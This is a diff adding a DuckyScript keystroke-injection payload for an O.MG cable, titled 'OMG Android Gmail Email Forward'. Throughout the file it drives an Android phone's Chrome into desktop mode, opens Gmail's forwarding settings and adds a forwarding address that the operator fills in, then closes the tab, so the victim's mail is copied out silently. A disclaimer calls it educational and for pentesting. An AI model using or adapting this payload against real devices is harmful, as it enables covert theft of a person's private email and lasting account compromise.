@@ -1,0 +1,94 @@
+REM # ---------------------------------------------------------------------------------------------------
+REM # Disclaimer: This script is for educational and pentest purposes ONLY! Use at your own risk!!
+REM # Title: OMG Android Gmail Email Forward
+REM # Author: Drewsec Twitter: InfoSec_DrewZe
+REM # Target: Tested on Android 10 device, it may require changes to work on newer versions
+REM # Note: This script will only work if the target is logged into their google account in Chrome
+REM # ---------------------------------------------------------------------------------------------------
+
+
+REM # -------------------------------------------------
+REM # Launch Chrome Browser and enable Desktop Mode
+REM # -------------------------------------------------
+
+TAB
+DELAY 250
+GUI f
+DELAY 1000
+UP
+DELAY 1000
+STRING chrome
+ENTER
+TAB
+DELAY 250
+ENTER
+DELAY 500
+TAB
+TAB
+TAB
+DELAY 100
+ENTER
+DELAY 800
+ALT e
+DELAY 1500
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+ENTER
+
+REM # ----------------------------------------------
+REM # Travel to Gmail forwarding settings page
+REM # ----------------------------------------------
+
+DELAY 800
+CTRL l
+DELAY 1000
+STRING https://mail.google.com/mail/u/0/#settings/fwdandpop
+DELAY 500
+ENTER
+DELAY 5000
+
+REM # ----------------------------------------------
+REM # Add email forward
+REM # ----------------------------------------------
+
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 100
+ENTER
+DELAY 250
+
+REM # Enter your email here 
+STRING your.email.goes.here@changethis.com
+
+DELAY 50
+ENTER
+DELAY 3000
+TAB
+ENTER
+DELAY 1500
+TAB
+DELAY 450
+ENTER
+
+REM # ----------------------------------------
+REM # Close Chrome Tab
+REM # ----------------------------------------
+
+CTRL w
+DELAY 800
+ALT f
+DELAY 500
+ALT f4
